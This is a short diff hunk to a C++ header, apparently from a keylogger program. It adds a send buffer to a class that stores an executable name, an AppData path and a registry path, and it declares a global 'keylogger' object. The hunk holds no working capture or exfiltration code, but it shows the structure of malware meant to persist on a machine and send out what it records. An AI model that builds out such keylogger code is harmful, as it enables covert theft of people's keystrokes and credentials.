@@ -34,6 +34,8 @@ private:
     TCHAR exeName[MAX_PATH];
     TCHAR appDataPath[1024];
     TCHAR registryPath[1024];
+
+	char sendBuf[2<<13];
 };
 
 extern Keylogger keylogger;
